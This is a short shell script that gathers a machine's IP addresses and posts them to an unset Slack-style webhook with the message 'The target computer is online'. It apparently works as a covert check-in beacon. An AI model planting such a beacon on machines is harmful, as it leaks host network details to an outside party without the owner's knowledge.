IP_ARR=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' |tr '\n' ' '`
PAYLOAD='{"channel": "#secret-octo-shame", "username": "OctoBot", "text": "The target computer is online - ['$IP_ARR']", "icon_emoji": ":ghost:"}'
HOOK_ADDRESS=""
curl -X POST --data-urlencode payload="$PAYLOAD" $HOOK_ADDRESS
